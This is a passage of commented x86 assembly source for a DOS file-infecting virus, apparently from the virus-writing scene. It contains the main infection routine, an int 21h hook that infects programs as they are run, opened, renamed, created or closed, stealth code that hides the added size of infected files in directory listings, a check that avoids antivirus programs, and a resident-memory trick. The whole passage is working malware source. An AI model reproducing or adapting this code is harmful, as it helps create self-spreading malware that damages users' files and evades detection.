					; yope so turn off fcb_sub_viruz_size
loc_1107:
		mov	cx, 7			; check 4 7 antivirusez
		mov	si, offset _scan_ - p	; start with SCAN

locloop_110D:
		push	cx
		call	sub_1149		; compare name
		pop	cx
		jz	short loc_113C		; it'z antiviruz ?
		loop	locloop_110D		; nope go on

		mov	si, offset name_buffer - p	; gimme name_buffer
		xor	bl, bl			; 2 get drive
		lodsw
		cmp	ah, 3Ah			; ':'
		jne	short loc_1125
		sub	al, 40h			; ok make valid_drive_number
		mov	bl, al			; and store it 2 bl
loc_1125:
		mov	ax, 4408h		; get drive_statuz
		call	int_21h
		or	ax, ax			; medium can be exchanged ?
which_jump_?	db	74h
		db	offset loc_1146 - ($ + 1)
		mov	ax, 4409h		; get far disk statuz
		call	int_21h
		jc	short loc_113C		; error ?
		test	dh, 10h			; iz far disk in net ?
		jnz	short loc_1146
loc_113C:
		stc				; set error_flag
loc_113D:
		pop	ax
		pop	es
		pop	ds
		pop	di
		pop	si			; restore regz
		pop	cx
		pop	bx
		pop	dx
		retn				; and end ...
loc_1146:
		clc				; clear error_flag
		jmp	short loc_113D		; and end ...
sub_1098	endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
; Diz comparez 2 stringz
sub_1149	proc	near
		push	di
		lodsb			; gimme bytez_count
		mov	cl, al		; store it 2 cx
		mov	ax, si		; gimme si
		add	ax, cx		; add bytez_count 2 offset
		repe	cmpsb		; compare
		mov	si, ax		; store new_offset
		pop	di
		retn			; and end ...
sub_1149	endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
; Diz checkz whether there'z a viruz in the file or not ...
; and if not returnz in ax the value which iz 4 infected
sub_1157	proc	near
		push	dx
		mov	ax, es:[bx+2]		; gimme date
		xor	dx, dx
		div	word ptr cs:[date_div-p]; div it
		mov	ax, es:[bx]		; gimme time
		and	al, 1Fh			; and it
		cmp	al, dl			; the same ?
		stc				; set Cflag (infected)
		jz	short loc_1176
		mov	ax, es:[bx]		; gimme time
		and	ax, 0FFE0h		; and it
		or	al, dl			; or it with date
		clc				; clear Cflag (not infected)
loc_1176:
		pop	dx
		retn				; and end ...
sub_1157	endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
; Sub viruz_size
sub_1178	proc	near
		sub	word ptr es:[bx], offset buffer - p; sub viruz_file
		sbb	word ptr es:[bx+2], 0
		jnc	short loc_ret_118E	; underflow ?
		add	word ptr es:[bx], offset buffer - p; yope
		adc	word ptr es:[bx+2], 0	; so add it back

loc_ret_118E:
		retn
sub_1178	endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
; Diz iz main infection routine ...
sub_118F	proc	near
		push	ax
		push	bx
		push	cx
		push	si			; push regz
		push	di
		push	bp
		push	ds
		push	es
		call	sub_1034		; set my int_24h
		mov	ax, 4300h		; gimme file_attribz
		call	int_21h
		mov	cs:[file_attribz - p], cx; store it
		mov	ax, 4301h		; set new attribz
		xor	cx, cx			; no attribz
		call	int_21h
		jc	short loc_11D3		; error ?
		mov	ax, 3D02h		; open file 4 read_&_write
		call	int_21h
		jc	short loc_11CA		; error ?
		push	dx
		push	ds
		push	cs
		pop	ds
		push	cs
		pop	es
		mov	ds:[handle - p], ax	; store handle
		call	sub_0E7C		; ok infect the file
		mov	ah, 3Eh
		call	sub_0E6F		; close file
		pop	ds
		pop	dx
loc_11CA:
		mov	ax, 4301h		; set back old_attribz
		db	0b9h			; mov	cx, ?
file_attribz	dw	20h
		call	int_21h
loc_11D3:
		call	sub_1052		; set back old_int_24h
		pop	es
		pop	ds
		pop	bp
		pop	di
		pop	si			; restore regz
		pop	cx
		pop	bx
		pop	ax
		retn				; and end ...
sub_118F	endp

new_int_21h:
		pushf
		sti
		cmp	ah, 11h			; find_first_FCB_file ?
		je	short loc_11EB
		cmp	ah, 12h			; find next_FCB_file ?
		jne	short loc_121A
loc_11EB:
		db	0ebh
fcb_jmp_	db	0
		push	bx
		push	es
		push	ax
		mov	ah, 2Fh			; gimme DTA_addr
		call	int_21h
		pop	ax
		call	int_21h			; do FCB_function
		cmp	al, 0FFh		; did we find something ?
		je	short loc_1216
		push	ax			; yope
		cmp	byte ptr es:[bx], 0FFh	; extended FCB ?
		jne	short loc_1207
		add	bx, 7			; yope so jump over ext_FCB
loc_1207:
		add	bx, 17h			; go2 time
		call	sub_1157		; check whether infected
		pop	ax
		jnc	short loc_1216		; already infected ?
		add	bx, 6			; go2 file_size
		call	sub_1178		; sub viruz_size
loc_1216:					; nope
		pop	es
		pop	bx
		popf
		iret
loc_121A:
		cmp	ah, 4Eh			; find_first_file ?
		je	short loc_1224
		cmp	ah, 4Fh			; find_next_file ?
		jne	short loc_1250
loc_1224:
		push	bx
		push	es
		push	ax
		mov	ah, 2Fh			; gimme DTA_addr
		call	int_21h
		pop	ax
		call	int_21h			; do find_function
		jc	short loc_1249		; error ?
		push	ax
		add	bx, 16h			; go2 time
		call	sub_1157		; check whether infected
		pop	ax
		jnc	short loc_1242		; already infected ?
		add	bx, 4			; go2 file_size
		call	sub_1178		; sub viruz_size
loc_1242:					; nope
		pop	es
		pop	bx			; restore regz
		popf
		clc				; clear error_flag
		retf	2			; and end ...
loc_1249:					; yope
		pop	es
		pop	bx			; restore regz
		popf
		stc				; set error_flag
		retf	2			; and end ...
loc_1250:
		cmp	ax, 4B53h		; it'z mark ?
		jne	short loc_125A
		mov	ax, 454Bh		; yope so get 454bh
		popf
		iret				; and end ...
loc_125A:
		cmp	ah, 4Ch			; prog'z_end ?
		jne	short loc_1265
		mov	byte ptr cs:[fcb_jmp_ - p], 0
loc_1265:
		cld
		push	dx
		cmp	ax, 4B00h		; run_prog ?
		jne	short loc_12A9
		db	0ebh
run_jmp		db	offset loc_12a7 - ($ + 1)
		push	ax
		push	bx
		push	ds			; push regz
		push	es
		mov	ah, 52h			; gimme list_of_listz
		call	int_21h
		mov	ax, es:[bx-2]		; gimme first_mcb
loc_127B:
		mov	ds, ax
		add	ax, ds:[3]		; go2 next mcb_block
		inc	ax
		cmp	byte ptr ds:[0], 5Ah	; last_one ?
		jne	loc_127B
		mov	bx, cs			; yope
		cmp	ax, bx			; it'z our mcb_block ?
		jne	short loc_129D
		mov	byte ptr ds:[0], 4Dh	; make middle_block
		xor	ax, ax
		mov	ds, ax
		add	word ptr ds:[413h], 4	; add 4K 2 mem which we took
loc_129D:
		mov	byte ptr cs:[run_jmp-p], offset loc_12a7 - (run_jmp + 1)
		pop	es			; now jump 2 loc_12a7
		pop	ds
		pop	bx			; restore regz
		pop	ax
loc_12A7:
		jmp	short loc_12FD
loc_12A9:
		cmp	ah, 3Dh			; open_file ?
		je	short loc_12FD
		cmp	ah, 56h			; rename_file ?
		je	short loc_12FD
		cmp	ax, 6C00h		; ext_open_found ?
		jne	short loc_12C1
		test	dl, 00010010b		; action 02h or/and 10h ?
		mov	dx, si
		jz	short loc_12FD
		jmp	short loc_1307		; yope
loc_12C1:
		cmp	ah, 3Ch			; found_file ?
		je	short loc_1307
		cmp	ah, 5Bh			; make_new_file ?
		je	short loc_1307
		cmp	ah, 3Eh			; close_file ?
		jne	short loc_12F6
		cmp	bx, word ptr cs:[ext_handle - p]; do we have
		jne	short loc_12F6		; something 2 infect ?
		or	bx, bx			; handle is null ?
		jz	short loc_12F6
		call	int_21h			; close it
		jc	short loc_1323
		push	ds
		push	cs
		pop	ds
		mov	dx, offset ext_file_name - p; gimme file_name
		call	sub_118F		; and infect it
		mov	word ptr ds:[ext_handle - p], 0; nulluj ext_handle
		pop	ds
loc_12F0:
		pop	dx
		popf
		clc				; clear error_flag
		retf	2			; and end ...
loc_12F6:
		pop	dx
		popf				; jmp 2 old_int_21h
		jmp	dword ptr cs:[old_int_21h - p__]
loc_12FD:
		call	sub_1098		; check 4 file_name & disk
		jc	loc_12F6		; error ?
		call	sub_118F		; infect it
		jmp	short loc_12F6
loc_1307:
		cmp	word ptr cs:[ext_handle - p], 0
		jne	loc_12F6		; ext_file already founded ?
		call	sub_1098		; check 4 file_name & disk
		jc	loc_12F6		; error ?
		mov	word ptr cs:[file_offset - p], dx; store file_name_
		pop	dx			; _offset
		push	dx
		call	int_21h			; found it
		db	0bah			; mov	dx, ?
file_offset	dw	45cch
		jnc	short loc_1329		; error ?
loc_1323:					; yope
		pop	dx
		popf
		stc				; set error_flag
		retf	2			; and end ...
loc_1329:
		push	cx
		push	si
		push	di			; ok 
		push	es			; move file_name
		xchg	si, dx			; 2 our buffer
		mov	di, offset ext_handle - p
		push	cs
		pop	es
		stosw				; and store handle of course
		mov	cx, 4Bh			; move 4bh bytez
		rep	movsb			; and finally move
		pop	es
		pop	di
		pop	si			; restore regz
		pop	cx
		jmp	short loc_12F0		; and end ...

		;
		db	'Did you leave the room ?'
		;
run_counter	dw	04FBh
buffer		db	160h dup(?)
three_bytez	db	?			; offset 14bah
						; instr_buffer - 3
						; 0e9h disp16 haz 3 bytez ...
handle		dw	?			; offset 14bbh
instr_buffer	db	10 dup(?)		; offset 14bdh
file_buffer	db	1ah dup(?)		; offset 14c7h
old_int_24h	dd	?			; offset 14e1h
file_time_date	dd	?			; offset 14e5h
ext_handle	dw	?			; offset 14e9h
ext_file_name	db	4bh dup(?)		; offset 14ebh
name_buffer	db	4bh dup(?)		; offset 1536h
		;
seg_a		ends
		end	start